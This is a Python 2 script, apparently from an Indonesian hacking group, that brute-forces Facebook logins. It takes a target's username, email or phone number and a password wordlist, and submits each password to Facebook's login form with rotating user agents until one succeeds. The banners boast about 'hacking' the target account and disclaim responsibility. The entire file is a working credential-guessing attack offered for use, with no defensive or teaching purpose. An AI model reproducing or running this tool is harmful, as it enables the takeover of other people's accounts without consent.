#!/usr/bin/python
# -*- coding: utf-8 -*-
##
import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()
import os
import urllib
import hashlib
import os
import random
import sys
import time
from time import sleep
os.system('clear')
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)
print ('loading..')
sleep(0.1)
mengetik('\33[0;32m> \33[32;1m> \33[0;36m> \33[31;1m> \33[30;1m> \33[33;1m> \33[1;33m>] \33[31;1m100%')
os.system('clear')
sleep(0.1)
print
mengetik('\33[0;32mSELAMAT DATANG DI TOOL KAMI ANONYMOUS CYBER TEAM INDONESIA')
print
mengetik('\33[33;1mfbbrute terbaru new bug server tolong jangan disebar luaskan agar menjaga tool ini agar tidak cepat koid')
print
mengetik('\33[31;1mathor tidak bertanggung jawab bila terjadi hal yg tidak diinginkan dosa tanggung sendiri gunakan dengan bijak')
sleep(1)
os.system('clear')
print ("\33[31;1m   ___    __         ____   ___ ")
print ("\33[31;1m  / _ )  / /        / __/  / _ )")
print ("\33[31;1m / _  | / /__      / _/   / _  |")
print ("\33[31;1m/____/ /____/     /_/    /____/ ")

print ("\33[31;1m===========================================")
print ("\33[0;32m|Author : BLACK-HORNET92                  |")
print ("\33[0;32m|       : YUDI                            |")
print ("\33[0;32m|version: 5.1 BLACKFB                     |")
print ("\33[0;32m|Team   : ANONYMOUS CYBER TEAM AINDONESIA |")
print ("\33[31;1m===========================================")
print
mengetik('                 \33[36;1mloading')
print ("\33[0;32m     ==============================")
print ("\33[1;33m     |    GUNAKAN WEBMASTER LITE  |")
print ("\33[1;33m     |  UNTUK MENGEDIT WORDLISNYA |")
print ("\33[1;33m     |         TERIMAKASIH        |")
print ("\33[0;32m     ==============================")
time.sleep(0.5)
import sys
import mechanize
import cookielib
import random




email = str(raw_input("masukan Username(or)Email(or)no-hp target : "))


passwordlist = str(raw_input("masukan pass.txt: "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password tidak di temukan wordlist kurang joos😝😝")

	
	
def brute(password):
	sys.stdout.write("\r[*] mencoba🌊..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] passwod ditemukan👍👍👍💯 = {}".format(password))
			raw_input("klik inter untuk keluar....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	wel = """
        +========================================
        |......... 🐝🐝BLACKFB.V.5.1🐝🐝 .......|
        =========================================
"""
	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print " [*] Akun yg di hack : {}".format(email)
	print " [*] jumlah attacker pass :" , len(total), "passwords"
	print " [*] hacking di mulai, mohon tunggu ...\n\n"

	
if __name__ == '__main__':
	main()
